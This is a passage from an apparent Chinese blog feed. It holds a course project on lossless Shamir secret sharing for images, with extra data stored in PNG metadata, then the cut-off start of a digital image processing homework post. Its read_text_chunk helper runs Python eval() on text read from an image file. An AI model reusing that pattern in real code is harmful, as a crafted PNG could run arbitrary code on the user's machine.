href="#面向图像的秘密共享" class="headerlink" title="面向图像的秘密共享"></a>面向图像的秘密共享</h2><p>事实上，当我们需要对图像类型的信息进行秘密共享时，针对字符数据的秘密共享方案依然能够很好的工作</p><p>因为图像的每个像素点都可以由RGB表示（灰度图为一个灰度值），所以我们可以找到合适的方案对色值进行加密并共享，只需在原先的秘密共享方案上增加一些<strong>预处理</strong>和<strong>后处理</strong>的过程</p><p>预处理即将图像特征提取，转化为二进制数据</p><p>而后处理则是将解密后的二进制数据转回图像</p><p>而密文数据的中间传输形态同样也可以是图像，虽然看起来是一些杂乱无章的噪点</p><h3 id="算法选择"><a href="#算法选择" class="headerlink" title="算法选择"></a>算法选择</h3><p>基本的算法框架我们选用<strong>Shamir秘密共享方案</strong></p><p>相比于CRT中进行的幂运算，Shamir中涉及的<strong>多项式运算更适合同时对整个图像数组进行计算</strong></p><p>但是在图像类型的Shamir秘密共享中<strong>有一点需要注意</strong>：</p><script type="math/tex; mode=display">S = F(0) = \sum_{j=1}^{T} F(x_j) \prod_{\substack{l=1 \\ l \neq j}}^{T} \frac{x_l}{x_l - x_j} \mod q</script><p>这里的模数q需要选取一个素数，而我们保存的影子图像的每个通道位深只有8位，即0到255</p><p>如果我们选择的模数q如果小于255，那么一些像素点算出来的多项式值的精度便会丢失</p><p>而如果我们选择的模数大于255，那么<strong>如果像素点的多项式值模257后的余数大于255时，我们无法将其直接作为像素值保存</strong>，这部分像素点的数据无法直接传输</p><p>所以问题的关键是如何保存由模数造成的无法传输的额外信息</p><p>这里我们选择一个与256较为接近的模数，即257，这样我们只需要记录一种情况，即多项式的值mod257后余256</p><p><strong>我们考虑将这些余256的某通道像素点在图像数组中的索引放在一个列表中，并将这个列表保存在图片的元数据（Meta data）中</strong></p><h3 id="影子图像生成"><a href="#影子图像生成" class="headerlink" title="影子图像生成"></a>影子图像生成</h3><p>影子图像生成的步骤如下图：</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/%E7%94%9F%E6%88%90%E7%A7%98%E5%AF%86%E5%9B%BE%E7%89%87.png" alt="生成秘密图片"></p><ol><li>随机生成多项式系数，并将原像素值（即秘密）作为$a_0$。</li><li>将原图像数组碾平，使得三个通道R、G、B上的值可以同时进行多项式计算，并将计算结果合并为彩色的影子图像。</li><li>如果生成影子图像时，像素点上的值为256，则将其置0，并保存索引信息到元数据中</li><li>遍历索引，直到生成N个影子图像</li></ol><h3 id="原图像恢复"><a href="#原图像恢复" class="headerlink" title="原图像恢复"></a>原图像恢复</h3><p>恢复原图像时需要先将元数据中存储的索引数组恢复为一个图像数组，并与秘密图像提取的数组相加，这样就能<strong>恢复余数为256的像素点的信息</strong></p><p>而恢复算法则选用<strong>拉格朗日插值法</strong></p><p>原图像恢复的步骤如下图：</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/%E5%8E%9F%E5%9B%BE%E5%83%8F%E6%81%A2%E5%A4%8D.png" alt="原图像恢复"></p><ol><li>读取并处理r个影子图像，每个图像的三通道值碾平为一维数组</li><li>将影子图像元数据中的额外信息提取并保存，恢复为一个余256像素点组成的一维数组，并<strong>直接加</strong>到影子图像的数组上</li><li>每次从r个影子图像数组各读取一个像素值，使用拉格朗日插值法恢复出原图像的一个像素值</li></ol><h3 id="创新点"><a href="#创新点" class="headerlink" title="创新点"></a>创新点</h3><p>其实一开始我有考虑过将程序改造为多线程，并将其作为一个创新点。但是后来我意识到，<strong>秘密共享其实是一个计算密集型的过程</strong>。对于python的并发编程来说，I/O密集型的程序比计算密集型的程序更能充分利用多线程的好处。<strong>在本任务中使用多线程，对速度的提升不大</strong>。</p><h4 id="无损恢复"><a href="#无损恢复" class="headerlink" title="无损恢复"></a>无损恢复</h4><p>本算法<strong>最大的创新点</strong>，就是<strong>实现了无损的图像秘密共享过程，并且生成的影子图像的大小不会太大</strong></p><p>较为常见的模251和模257都会不同程度上地导致原图像信息的丢失</p><p>如果我们能将模256的信息额外保存在图片的元数据中，就能实现无损恢复</p><p>将中间影子图像的格式选为png，我们能够快速的将额外信息存在文件的chunk中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">insert_text_chunk</span>(<span class="params">src_png, dst_png, text</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;在png中的第二个chunk插入自定义内容&#x27;&#x27;&#x27;</span></span><br><span class="line">    reader = png.Reader(filename=src_png)</span><br><span class="line">    chunks = reader.chunks()<span class="comment">#创建一个每次返回一个chunk的生成器</span></span><br><span class="line">    chunk_list = <span class="built_in">list</span>(chunks)</span><br><span class="line">    chunk_item = <span class="built_in">tuple</span>([<span class="string">b&#x27;tEXt&#x27;</span>, text])</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    chunk_list.insert(index, chunk_item)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(dst_png, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> dst_file:</span><br><span class="line">        png.write_chunks(dst_file, chunk_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_text_chunk</span>(<span class="params">src_png, index=<span class="number">1</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;读取png的第index个chunk&#x27;&#x27;&#x27;</span></span><br><span class="line">    reader = png.Reader(filename=src_png)</span><br><span class="line">    chunks = reader.chunks()</span><br><span class="line">    chunk_list = <span class="built_in">list</span>(chunks)</span><br><span class="line">    img_extra = chunk_list[index][<span class="number">1</span>].decode()</span><br><span class="line">    img_extra = <span class="built_in">eval</span>(img_extra)</span><br><span class="line">    <span class="keyword">return</span> img_extra</span><br></pre></td></tr></table></figure><p>那么选择存入元数据的额外信息需要保证能有<strong>很高的信息密度</strong>，很显然将<strong>余256的索引存在一个数组*</strong>是个合适的选择</p><p>通过numpy提供的<strong>where()方法</strong>，我们可以快速的从数组中找到值为256的元素的索引，并利用该索引置0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">indices = np.where(secret_img == <span class="number">256</span>)[<span class="number">0</span>]</span><br><span class="line">img_extra = indices.tolist()</span><br><span class="line">secret_img[indices] = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>在恢复图像时，我们只需要将影子图像的数组与从额外信息恢复的同尺寸的数组相加即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">imgs_add = np.zeros_like(imgs,dtype=np.int32)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">        <span class="keyword">for</span> indices <span class="keyword">in</span> imgs_extra[i]:</span><br><span class="line">            imgs_add[i][indices] = <span class="number">256</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">        y = imgs[:, i]</span><br><span class="line">        ex_y = imgs_add[:, i]</span><br><span class="line">        y = y + ex_y</span><br><span class="line">        pixel = lagrange(x, y, r, <span class="number">0</span>) % <span class="number">257</span></span><br><span class="line">        img.append(pixel)</span><br></pre></td></tr></table></figure><h4 id="一个py文件实现所有功能"><a href="#一个py文件实现所有功能" class="headerlink" title="一个py文件实现所有功能"></a>一个py文件实现所有功能</h4><p>而另一个创新点，则是将整个秘密共享过程集成在一个python源码中。在控制台运行该py文件时，<strong>通过设置选项和传入不同的参数</strong>，我们能够完成三种任务：影子图像生成、原图像恢复以及图像像素值对比</p><p>这种一站式的解决方案极大地简化了操作流程，用户无需切换不同的程序或脚本即可完成整个秘密共享的周期。</p><p>程序中的关键选项说明如下：</p><ul><li><code>-e</code> / <code>--encode</code>：这个选项后跟原始图像的路径，用于指定需要进行秘密共享加密的图像文件。</li><li><code>-d</code> / <code>--decode</code>：这个选项后跟解密后的图像的保存路径，用于指定解密操作的输出目录。</li><li><code>-n</code>：这个选项后跟的参数设置了要生成的影子图像的总数，即秘密共享的分片数。</li><li><code>-r</code>：这个选项后跟的参数设置了重建原始图像所需的最少影子图像数，即秘密共享的阈值。</li><li><code>-i</code> / <code>--index</code>：这个选项接受一个或多个整数参数，代表用于解密操作的影子图像的索引。</li><li><code>-c</code> / <code>--compare</code>：这个选项后跟两个图像文件的路径，用于比较这两个图像的差异。</li></ul><p>同时，你还可以使用<code>-h</code>参数调出程序的说明书，<strong>这些功能都得益于python的argparse库</strong></p><p>值得注意的是，解密时影子图像需和Shamir.py存储在同一路径下，并以secret_{index}的规则命名，且格式为PNG</p><h4 id="显示直观且详细"><a href="#显示直观且详细" class="headerlink" title="显示直观且详细"></a>显示直观且详细</h4><p>通过精心设计的命令行界面，本程序在执行各种操作时，如加密、解密和比较图像，都会<strong>给出清晰的进度反馈和详尽的状态信息</strong>。例如，在解密过程中，程序不仅会<strong>显示当前处理的进度条</strong>，还会在完成后输出解密<strong>所用的总时间</strong>，使用户能够明确地了解到任务执行的效率。</p><p>具体实现如下：</p><ol><li><p><strong>进度条显示</strong>：在 <code>decode</code> 函数中，通过计算当前处理的像素与总像素数的比例，我们实现了一个动态更新的进度条。这个进度条不仅在视觉上给出了解密过程的即时反馈，还通过百分比精确地表达了当前的完成状态。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">percent_done = (i + <span class="number">1</span>) * <span class="number">100</span> // dim</span><br><span class="line"><span class="keyword">if</span> last_percent_reported != percent_done:</span><br><span class="line">    <span class="keyword">if</span> percent_done % <span class="number">1</span> == <span class="number">0</span>:  <span class="comment"># 每增加1%更新一次进度</span></span><br><span class="line">        last_percent_reported = percent_done</span><br><span class="line">        bar_length = <span class="number">50</span></span><br><span class="line">        block = <span class="built_in">int</span>(bar_length * percent_done / <span class="number">100</span>)</span><br><span class="line">        text = <span class="string">&quot;\r[&#123;&#125;&#123;&#125;] &#123;:.2f&#125;%&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;█&quot;</span> * block, <span class="string">&quot; &quot;</span> * (bar_length - block), percent_done)</span><br><span class="line">        sys.stdout.write(text)</span><br><span class="line">        sys.stdout.flush()</span><br></pre></td></tr></table></figure></li><li><p><strong>文件大小的动态显示</strong>：使用 <code>get_file_size</code> 函数，程序在保存每个影子图像和恢复的原图像后，都会输出文件的大小。这个大小是动态计算并格式化的，根据文件的实际大小自动选择最合适的单位（如B, KB, MB），使信息展示更为直观。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">size = get_file_size(secret_img_path)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;secret_img_path&#125;</span> saved.&quot;</span>, size)</span><br></pre></td></tr></table></figure></li><li><p><strong>图像比较的详细报告</strong>：在比较两个图像时，<code>compare_images</code> 函数不仅输出了两图像的<strong>平均差异值，还输出了最大差异、最小差异以及差异的标准差</strong>，为用户提供了全面的图像差异分析。该<strong>报告的结果能充分说明本算法在无损秘密共享上的可靠性</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Mean difference:&quot;</span>, diff_value)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Max difference:&quot;</span>, <span class="built_in">round</span>(np.<span class="built_in">max</span>(diff), <span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Min difference:&quot;</span>, <span class="built_in">round</span>(np.<span class="built_in">min</span>(diff), <span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Standard deviation of difference:&quot;</span>, <span class="built_in">round</span>(np.std(diff), <span class="number">4</span>))</span><br></pre></td></tr></table></figure></li><li><p><strong>运行时间的直观显示</strong>：在程序的关键节点，如加密结束或解密完成后，程序会计算并显示整个操作所花费的时间。这不仅提供了操作的即时反馈，而且还允许用户对程序的性能进行评估。通过记录操作开始和结束的时间戳，程序可以输出精确到毫秒的运行时间，使得性能测试结果更加准确。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start_time = time.time()  <span class="comment"># 操作开始前记录时间</span></span><br><span class="line"><span class="comment"># ... 执行操作 ...</span></span><br><span class="line">end_time = time.time()    <span class="comment"># 操作结束后记录时间</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Operation completed. Time elapsed: <span class="subst">&#123;end_time - start_time:<span class="number">.2</span>f&#125;</span> seconds.&quot;</span>)</span><br></pre></td></tr></table></figure></li></ol><p>以上功能的实现，确保了用户在使用本程序时，能够获得详尽的操作信息，包括操作进度、文件大小以及操作耗时等。这些直观的显示信息不仅提高了用户操作的透明度，也增强了用户对程序性能的信心。</p><h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p>在实验中，我会对程序的<strong>不同功能的执行效果</strong>进行演示，并通过<strong>消融实验</strong>测试本程序实现的无损模块<strong>在各方面上的提升</strong></p><p>我会使用我的头像作为测试样本，原图像avatar.png如下</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/test.jpg" alt="test" style="zoom:50%;" /></p><p>原图像的大小为243KB，尺寸为640*640</p><p>之所以选择png格式的原图是因为PNG是一种无损压缩的图像格式，这意味着在重新恢复图像时，像素数据不会发生变化，这更有利于我们精准测试整个过程是不是无损的秘密共享</p><h4 id="功能测试"><a href="#功能测试" class="headerlink" title="功能测试"></a>功能测试</h4><p>首先进行影子图像的生成，执行如下指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Shamir.py -e avatar.png -n 5 -r 3 </span><br></pre></td></tr></table></figure><p>成功生成5张影子图像</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231111212119557.png" alt="image-20231111212119557"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231111212211000.png" alt="image-20231111212211000"></p><p>接下来使用图像恢复功能，执行如下指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Shamir.py -d avatar_recover.png -r 3 -i 1 4 5</span><br></pre></td></tr></table></figure><p>我们选用序号为1、4、5的影子图像来恢复原图像</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231111212253826.png" alt="image-20231111212253826"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231111212319416.png" alt="image-20231111212319416"></p><p>最后我们来对比一下恢复得到的图像与原图像之间像素值的差别</p><p>执行如下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Shamir.py -c avatar_recover.png avatar.png</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231111212340635.png" alt="image-20231111212340635"></p><p><strong>恢复图像与原图像完全一致</strong>，说明成功实现了无损的图片秘密共享</p><p>如果我们想同时执行所有任务，完成加密解密和对比，可以执行下面这条指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Shamir.py -e avatar.png -n 5 -r 3 -d avatar_recover.png -i 1 4 5 -c avatar_recover.png avatar.png</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231111213341368.png" alt="image-20231111213341368"></p><h4 id="消融实验"><a href="#消融实验" class="headerlink" title="消融实验"></a>消融实验</h4><p>在消融实验中，我会测试额外信息这个模块的影响</p><p>将源代码中有关extra部分的内容去掉后，我们再次执行整个过程</p><p>下图是<strong>去掉额外信息模块</strong>后的算法运行结果和恢复的图像</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231111213949707.png" alt="image-20231111213949707"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/avatar_recover-16997100367043.png" alt="avatar_recover" style="zoom:50%;" /></p><p>下图是<strong>拥有额外信息模块</strong>的算法运行结果和恢复的图像</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231111213701330.png" alt="image-20231111213701330"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/avatar_recover.png" alt="avatar_recover" style="zoom:50%;" /></p><p>首先是无损方面，没有额外信息模块的算法因为余256像素点的影响，平均像素值差异为0.9862</p><p>而拥有额外信息模块的算法恢复的图片与原图完全一致，平均像素值差异为0</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231111214529421.png" alt="image-20231111214529421"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231111214822083.png" alt="image-20231111214822083"></p><p>直接观察恢复的图像我们能够更直观的发现原因</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231111214852488.png" alt="image-20231111214852488"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231111220014444.png" alt="image-20231111220014444"></p><p>没有额外信息模块的算法恢复的图像中，有许多因为丢失信息而恢复失败的像素点</p><p>上述差别说明<strong>额外信息模块使得信息都被保留，实现了无损秘密共享</strong></p><p>除了图像指令，我们还应关注算法的时间以及影子图像的大小</p><p>额外信息模块中进行了更多的运算以及存储，我们需要了解其对于用户体验的影响</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231111215428807.png" alt="image-20231111215428807"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231111215414634.png" alt="image-20231111215414634"></p><p>可以发现，添加了额外信息模块的算法运行时间变化不大，说明我们<strong>在元数据中添加信息的效率非常高，解码时余256点的恢复效率也很高</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231111215701758.png" alt="image-20231111215701758"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231111215723298.png" alt="image-20231111215723298"></p><p>添加在元数据中的信息占影子图像大小的3%左右，说明我们添加的额外信息的<strong>信息密度非常高，保证了无损秘密共享的同时也不会消耗更多的空间资源</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> project </tag>
            
            <tag> 数据安全与隐私计算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字图像处理 作业一</title>
      <link href="/posts/9f249bc44c42/"/>
      <url>/posts/9f249bc44c42/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本系列文章为学校课程《数字图像处理》布置的一些小project作业</p><p>除了给出每个问题的解答和代码，我也会附上相关知识点，以方便后续复习</p><h1 id="前置概念"><a href="#前置概念" class="headerlink" title="前置概念"></a>前置概念</h1><h2 id="图像表示方法及相关概念"><a href="#图像表示方法及相关概念" class="headerlink" title="图像表示方法及相关概念"></a>图像表示方法及相关概念</h2><p>做题之前先<strong>回顾</strong>一些前置<strong>概念</strong></p><p>一般来说一张图片可以从色彩丰富度上分析，也可以从亮度上分析</p><div class="note info flat"><p><strong>灰度</strong>是表明图像明暗的数值，即黑白图像中点的颜色深度，范围一般从0到255，白色为255 ，黑色为0，故黑白图片也称灰度图像。灰度值指的是单个像素点的亮度。灰度值越大表示越亮。</p></div><p>灰度图像与黑白图像不同，在计算机图像领域中黑白图像只有黑色与白色两种颜色；但是，灰度图像在黑色与白色之间还有许多级的颜色深度。</p><p><strong>灰度级</strong>：灰度级表明图像中不同灰度的最大数量。灰度级越大，图像的亮度范围越大。</p><p>如果我们需要表示彩色图片，就需要引入<strong>RGB</strong>和<strong>HSV</strong>两种表示方法了</p><p>RGB和HSV分别是两种常见的彩色图像表示方法</p><div class="note info flat"><p><strong>RGB颜色空间</strong>以R(Red:红)、G(Green:绿)、B(Blue:蓝)三种基本色为基础，进行不同程度的叠加，产生丰富而广泛的颜色，所以俗称三基色模式。</p><p>与灰度图不同之处在于，RBG图的每个像素点都有3个值表示颜色，也叫3通道。如RGB(10，47，200)</p></div><p>相比于类似调色板的RGB颜色空间，HSV更接近于颜色的直观特性</p><div class="note info flat"><p><strong>HSV颜色模型</strong>是指H、S、V三维颜色空间中的一个可见光子集，它包含某个颜色域的所有颜色。每一种颜色都是由色相（Hue，简H），饱和度（Saturation，简S）和色明度（Value，简V）所表示的。这个模型中颜色的参数分别是：色调（H），饱和度（S），亮度（V）。</p><p><strong>色调</strong>色彩信息，即所处的光谱颜色的位置。该参数用一角度量来表示，取值范围为0°～360°。若从红色开始按逆时针方向计算，红色为0°，绿色为120°，蓝色为240°。它们的补色是：黄色为60°，青色为180°，紫色为300°</p><p><strong>饱和度</strong>是指色彩的鲜艳程度，也称色彩的纯度。饱和度取决于该色中含色成分和消色成分（灰色）的比例。含色成分越大，饱和度越大；消色成分越大，饱和度越小。取值范围为0.0～1.0</p><p><strong>亮度（色明度）</strong>的概念与RGB中三原色的值类似，代表色彩的明亮程度。</p><p>HSV模型对应于圆柱坐标系中的<strong>一个圆锥形子集</strong>，圆锥的顶面对应于V=1。它包含RGB模型中的R=1，G=1，B=1 三个面，所代表的颜色较亮。色彩H由绕V轴的旋转角给定。饱和度]S取值从0到1，所以圆锥顶面的半径为1。</p><p>该圆锥形为倒立，顶点处V值为0，而底面上的V值为1</p></div><div class="note info flat"><p><strong>对比度</strong>：指一幅图中灰度反差的大小，$对比度 =  最大灰度值/最小灰度值$</p></div><div class="note info flat"><p><strong>深度</strong>：图像深度是指像素深度中实际用于存储图像的灰度或色彩所需要的比特位数。假定图像的像素深度为16bit，但用于表示图像的灰度或色彩的位数只有15位，则图像的图像深度为15。图像深度决定了图像的每个像素可能的颜色数，或可能的灰度级数。例如，彩色图像每个像素用R,G,B三个分量表示,每个分量用8位，像素深度为24位</p></div><h2 id="图像基本运算"><a href="#图像基本运算" class="headerlink" title="图像基本运算"></a>图像基本运算</h2><h3 id="像素级运算"><a href="#像素级运算" class="headerlink" title="像素级运算"></a>像素级运算</h3><h4 id="点运算"><a href="#点运算" class="headerlink" title="点运算"></a>点运算</h4><img src="/posts/9f249bc44c42/image-20231105104611178.png" class="" title="image-20231105104611178"><img src="/posts/9f249bc44c42/image-20231105104635407.png" class="" title="image-20231105104635407"><p><strong>点运算</strong>针对图像中的每一个像素灰度，<strong>独立地</strong>进行灰度值的改变</p><p>输出图像中每个像素点的灰度值，<strong>仅取决于相应输入像素点</strong>的值</p><h4 id="代数运算"><a href="#代数运算" class="headerlink" title="代数运算"></a>代数运算</h4><img src="/posts/9f249bc44c42/image-20231105104856290.png" class="" title="image-20231105104856290"><img src="/posts/9f249bc44c42/image-20231105104943809.png" class="" title="image-20231105104943809"><img src="/posts/9f249bc44c42/image-20231105105011256.png" class="" title="image-20231105105011256"><h4 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h4><img src="/posts/9f249bc44c42/image-20231105105054296.png" class="" title="image-20231105105054296"><h3 id="图像的空域变换"><a href="#图像的空域变换" class="headerlink" title="图像的空域变换"></a>图像的空域变换</h3><p>空域变换是指在图像空间，对图像的形状、像素值等进行变化、映射等处理</p><p>空域变换可以分为几何变换和非几何变换</p><h4 id="几何变换"><a href="#几何变换" class="headerlink" title="几何变换"></a>几何变换</h4><p>几何变换是指对原始图像，按照需要改变其大小、形状和位置的变化</p><p>即<script type="math/tex">g(x',y') = f(x,y)</script></p><img src="/posts/9f249bc44c42/image-20231105110209535.png" class="" title="image-20231105110209535"><p>实现几何变换，我们可以使用<strong>多项式变换</strong>或<strong>透视变换</strong></p><p>另一种形式的几何变换是<strong>灰度插值</strong></p><p>即缩小图片分辨率时如何保留原有图像的信息</p><p>常用的灰度插值方法有<strong>最近邻插值法</strong>、<strong>双线性插值</strong>、<strong>三次卷积插值算法</strong>等等</p><h4 id="非几何变换（灰度变换）"><a href="#非几何变换（灰度变换）" class="headerlink" title="非几何变换（灰度变换）"></a>非几何变换（灰度变换）</h4><p>非几何变换属于像素值的变换，<strong>没有几何位置的改变</strong>，也可以称作灰度变换</p><p>灰度变换的目的是为了改善画质，使图像的显示效果更加清晰</p><h2 id="空间域图像增强"><a href="#空间域图像增强" class="headerlink" title="空间域图像增强"></a>空间域图像增强</h2><h3 id="基本灰度变换"><a href="#基本灰度变换" class="headerlink" title="基本灰度变换"></a>基本灰度变换</h3><p>这里介绍几种常用的灰度变换</p><p><strong>图像反转</strong>：故名思义，使用灰度级的最大灰度值减去原来图像每个像素点的灰度值</p><ul><li><p>公式：$S=L-1-r\quad L=2^b$</p></li><li><p>应用：例如查看医学图像中病变组织的位置</p><img src="/posts/9f249bc44c42/image-20231105112323544.png" class="" title="image-20231105112323544"></li></ul><p><strong>对数变换</strong>：使得新灰度值为原灰度值的对数，将输入中范围较窄的低灰度值映射为输出中范围较宽的灰度值。</p><ul><li><p>公式：<script type="math/tex">s=c\cdot  log(1+r)</script></p></li><li><p>应用：用来增强图像中较暗的部分</p><img src="/posts/9f249bc44c42/image-20231105113624346.png" class="" title="image-20231105113624346"></li></ul><p><strong>幂次变换</strong>：</p><ul><li><p>公式：$s=c\cdot r^\gamma $</p></li><li><p>应用：使图像变得更接近真实值</p><img src="/posts/9f249bc44c42/image-20231105121431205.png" class="" title="image-20231105121431205"></li></ul><h3 id="灰度直方图"><a href="#灰度直方图" class="headerlink" title="灰度直方图"></a>灰度直方图</h3><p><strong>灰度直方图</strong>展示了图像中每种灰度级的像素个数</p><p>横坐标为灰度级，纵坐标表示该灰度级出现的频率</p><p>绘制图像的灰度直方图可以按照如下算法:</p><div class="note primary flat"><p>假设有一个灰度级为L的灰度图像f(x,y)，大小为M*N</p><ol><li>初始化$hist[k]=0;k=0,…,L-1$</li><li>统计$hist[f(x,y)]$++$;x=0,…,M-1,y=0,…,N-1$</li><li>归一化$hist[f(x,y)]/(M*N)$</li></ol></div><p>灰度直方图可以应用于<strong>图像快速检测</strong>、<strong>分割前景背景</strong>、<strong>目标面积计算</strong></p><p>彩色图像可以分别计算其R、G、B通道上的直方图</p><h3 id="直方图处理"><a href="#直方图处理" class="headerlink" title="直方图处理"></a>直方图处理</h3><h4 id="直方图均衡化"><a href="#直方图均衡化" class="headerlink" title="直方图均衡化"></a>直方图均衡化</h4><p>直方图呈均匀分布时，对比度会有明显增强</p><p>通过灰度变换函数，将原图像直方图的分布均衡化，这一过程称为<strong>直方图均衡化</strong></p><img src="/posts/9f249bc44c42/image-20231105142229662.png" class="" title="image-20231105142229662"><p>想要使直方图均衡化，那么此时<strong>$D_B$就是均匀分布</strong>的</p><img src="/posts/9f249bc44c42/image-20231105143057840.png" class="" title="image-20231105143057840"><p>可以推导出均衡化公式如下</p><img src="/posts/9f249bc44c42/image-20231105143256782.png" class="" title="image-20231105143256782"><p>下面是直方图均衡化比较直观的效果</p><img src="/posts/9f249bc44c42/image-20231105143331173.png" class="" title="image-20231105143331173"><h4 id="直方图匹配"><a href="#直方图匹配" class="headerlink" title="直方图匹配"></a>直方图匹配</h4><p>有一些应用方向上用均匀直方图的基本增强并不是好方法，有时问希望<strong>指定处理的图像所具有的直方图形状</strong></p><p>这种用于产生处理后有特殊直方图的图像的方法，叫做<strong>直方图匹配或直方图规定化处理</strong></p><p>一般来说，从当前直方图形状<strong>变为均衡化直方图的变换函数更为好求</strong></p><p>那么我们可以考虑利用<strong>均衡直方图作为中间桥梁</strong>，</p><img src="/posts/9f249bc44c42/image-20231105181721064.png" class="" title="image-20231105181721064"><h1 id="HW1-直方图均衡"><a href="#HW1-直方图均衡" class="headerlink" title="HW1 直方图均衡"></a>HW1 直方图均衡</h1><p>作业要求 ：</p><blockquote><p>实现river.jpg 图像的直方图均衡，不能直接使用Matlab的histeq( )函数。将有关</p><p>均衡图像和调用histeq( )函数的结果作比较。 </p></blockquote><p><code>river.jpg</code>如下</p><img src="/posts/9f249bc44c42/river.JPG" class="" title="river"><p>首先我们需要读入图像</p><p>matlab中使用<code>imread()</code>函数，括号中参数为图片路径，本题为<code>river.JPG</code></p><p>我们想要对比图像在直方图均衡前后的灰度直方图变化，就需要展示变换前后的直方图</p><p>MATLAB的图像处理工具箱（Image Processing Toolbox）中的<code>imhist</code> 函数用于计算图像的直方图，其返回一个表示直方图的向量 <code>counts</code>，我们可以将其作为直方图纵轴；和一个灰度级别的向<code>x</code> 是灰度级别的向量，它表示了直方图的横坐标，通常是从0到255的整数。</p><p>查阅matlab的文档和老师发的PPT《A Quick Tutorial on 